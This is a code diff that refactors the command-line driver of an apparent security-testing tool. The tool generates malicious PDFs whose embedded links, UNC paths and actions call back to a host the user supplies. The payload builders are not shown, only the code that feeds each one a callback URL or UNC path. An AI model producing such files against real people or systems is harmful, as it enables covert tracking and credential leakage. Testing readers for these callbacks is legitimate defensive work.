@@ -13,14 +13,14 @@
 ## https://github.com/jonaslejon/malicious-pdf
 
 import sys
-if sys.version_info[0] < 3:
-    raise SystemExit("Use Python 3 (or higher) only")
-
 import io
 import bz2
 import base64
 import ipaddress
 import validators
+import os
+import argparse
+from pathlib import Path
 
 def validate_url_or_ip_validators(input_string):
   """Validates if input is IP, URL, or Domain using ipaddress and validators."""
@@ -628,44 +628,58 @@ trailer
 ''')
 
 
+def ensure_scheme(host):
+    """Ensure the host has a scheme."""
+    if not host.startswith(('http://', 'https://')):
+        return f'https://{host}'
+    return host
+
+
+def main():
+    """Main function to generate malicious PDFs."""
+    parser = argparse.ArgumentParser(description="Create different types of malicious PDF files.")
+    parser.add_argument("host", help="The hostname or IP address to use in the PDF files.")
+    parser.add_argument("--output-dir", default=".", help="The directory to save the PDF files in.")
+    args = parser.parse_args()
+
+    host = args.host
+    output_dir = Path(args.output_dir)
+    output_dir.mkdir(parents=True, exist_ok=True)
+
+    if not validate_url_or_ip_validators(host):
+        print("Error: Invalid hostname or IP address.")
+        sys.exit(1)
+
+    print("[+] Creating PDF files..")
+
+    pdf_generators = {
+        1: (create_malpdf, f'\\\\{host}\\test'),
+        1.1: (create_malpdf, ensure_scheme(host)),
+        2: (create_malpdf2, ensure_scheme(host)),
+        3: (create_malpdf3, ensure_scheme(host)),
+        4: (create_malpdf4, host),
+        5: (create_malpdf5, ensure_scheme(host)),
+        6: (create_malpdf6, ensure_scheme(host)),
+        7: (create_malpdf7, ensure_scheme(host)),
+        8: (create_malpdf8, ensure_scheme(host)),
+        9: (create_malpdf9, ensure_scheme(host)),
+        10: (create_malpdf10, None),
+        11: (create_malpdf11, None),
+    }
+
+    for num, (func, content) in pdf_generators.items():
+        name = f"test{num}.pdf"
+        if isinstance(num, float):
+            name = f"test{int(num)}_{str(num).split('.')[1]}.pdf"
+        filename = output_dir / name
+        if content:
+            func(filename, content)
+        else:
+            func(filename)
+
+    print("[-] Done!")
+
 if __name__ == "__main__":
-
-  try:
-      # Get the input argument
-      input_arg = sys.argv[1]
-  except IndexError as e:
-      print(f"Usage: {sys.argv[0]} <burp-collaborator-domain-or-ip>")
-      print("Error: Please provide only the domain name or IP address, without 'http://' or 'https://'.")
-      sys.exit(1)
-
-  # Input validation
-  if "http://" in input_arg or "https://" in input_arg:
-      print("Error: Input should not include 'http://' or 'https://'. Please provide only the domain or IP.")
-      sys.exit(1)
-
-  host = input_arg
-
-  # Validate hostname or IP address
-  if not host or not isinstance(host, str):
-      print("Error: Invalid hostname or IP address.")
-      sys.exit(1)
-  if not validate_url_or_ip_validators(host):
-      print("Error: Invalid hostname or IP address.")
-      sys.exit(1)
-
-  print("[+] Creating PDF files..")
-
-  create_malpdf("test1.pdf", '\\\\' + '\\\\'  + host + '\\\\' + 'test')
-  create_malpdf("test1bis.pdf", 'https://' + host)
-  create_malpdf2("test2.pdf", 'https://' + host)
-  create_malpdf3("test3.pdf", 'https://' + host)
-  create_malpdf4("test4.pdf", host)
-  create_malpdf5("test5.pdf", 'https://' + host)
-  create_malpdf6("test6.pdf", 'https://' + host)
-  create_malpdf7("test7.pdf", 'https://' + host)
-  create_malpdf8("test8.pdf", 'https://' + host)
-  create_malpdf9("test9.pdf", 'https://' + host)
-  create_malpdf10("test10.pdf")
-  create_malpdf11("test11.pdf")
-
-  print("[-] Done!")
+    if sys.version_info[0] < 3:
+        raise SystemExit("Use Python 3 (or higher) only")
+    main()
